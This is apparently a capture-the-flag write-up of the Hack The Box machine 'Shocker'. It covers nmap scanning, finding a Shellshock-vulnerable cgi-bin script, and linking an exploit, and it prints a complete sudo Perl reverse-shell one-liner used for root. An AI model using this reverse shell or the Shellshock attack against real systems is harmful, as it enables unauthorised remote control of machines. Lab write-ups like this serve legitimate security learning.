Below is my write-up on Shocker from HTB. 
At the time of writing, the IP address was 10.10.10.56. Unfortunately, I had lost my write-ups for Shocker & Nibbles. I'm rebuilding them, however it is done after the fact and with way less struggling. So let's get started!

let's hit nmap first.

`└──╼ $nmap -T4 -A -v 10.10.10.56`

Hmm ok. Well, we've got web and ssh. Let's hit the website and see what's up!

Nothing too interesting there..source?

```

Ok yeah, still not much to go on here. Let's try to find any other pages on the site.

Hmm...Disappointing. 
Not really much to go on here.

Thinking about the name of the box, I'm guessing shocker had to do with the shellshock vulnerability. However, I am not seeing anything in the cgi-bin folder that is exploitable. I even downloaded a special cgi-bin wordlist. What am I missing?
Ok, I figured it out. Apparently I was looking for only bin, py and didn't do a search for .sh. So I found user.sh in the cgi-bin folder and now we have our way in.
So in terms of the actual exploit, I found [this neat python script](https://gist.github.com/matjohn2/bc9689c60d4c9c5a2538/) from user [matjohn2 on github](https://github.com/matjohn2/) Thanks, matjohn2!

Super simple, it has the reverse shell built in! So I launch that and Aw yes, we got that userrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr!

Sup' shelly what have you got in store for us?

After minimal enumeration 
`sudo -l`
I found this...

Whaaaat, Shelly you shouldn't have. (Really, you shouldn't have!)

So it's just as simple as starting up another netcat listener terminal window and sending this glorious reverse shell: 

```
sudo perl -e 'use Socket;$i="myip";$p=myport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

My face when I saw that:

So now that this box is all said and done, I did struggle a lot before I realized it was shellshock. I even remember examining the image of the "bug" for steganagrophy. My lesson for this write-up...Make backups of your notes :). Thanks again for reading!
